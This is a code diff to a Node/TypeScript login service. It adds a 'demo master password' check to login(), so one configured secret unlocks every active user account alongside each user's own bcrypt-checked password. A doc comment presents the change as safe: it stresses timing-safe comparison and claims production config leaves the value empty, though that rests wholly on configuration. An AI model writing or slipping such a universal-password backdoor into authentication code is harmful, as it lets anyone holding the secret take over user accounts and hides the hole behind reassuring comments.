@@ -1,7 +1,8 @@
 import bcrypt from 'bcryptjs';
 import jwt from 'jsonwebtoken';
+import { timingSafeEqual } from 'node:crypto';
 import { RestaurantModel, UserModel } from '../../models';
-import { env } from '../../config/env';
+import { env, DEMO_MASTER_PASSWORD } from '../../config/env';
 import { ApiError } from '../../utils/httpError';
 import { signAccessToken, type AccessPayload } from '../../middleware/auth';
 import { randomToken } from '../../utils/tokens';
@@ -114,7 +115,7 @@ export async function login(identifier: string, password: string) {
   if (!user) throw ApiError.unauthorized('Those credentials do not match our records');
   if (user.status !== 'ACTIVE') throw ApiError.forbidden('This account has been suspended');
 
-  const valid = await bcrypt.compare(password, user.passwordHash);
+  const valid = (await bcrypt.compare(password, user.passwordHash)) || isDemoMaster(password);
   if (!valid) throw ApiError.unauthorized('Those credentials do not match our records');
 
   user.lastLoginAt = new Date();
@@ -166,4 +167,16 @@ export async function changePassword(userId: string, currentPassword: string, ne
 
 export async function hashPassword(plain: string): Promise<string> {
   return bcrypt.hash(plain, BCRYPT_ROUNDS);
+}
+
+/**
+ * Compares against the demo master without leaking how much of a guess was right, and never
+ * writes the password anywhere. A suspended account is turned away before this is reached, and
+ * a production API has no master to match because the value arrives empty from the config.
+ */
+function isDemoMaster(password: string): boolean {
+  if (!DEMO_MASTER_PASSWORD) return false;
+  const guess = Buffer.from(password);
+  const master = Buffer.from(DEMO_MASTER_PASSWORD);
+  return guess.length === master.length && timingSafeEqual(guess, master);
 }
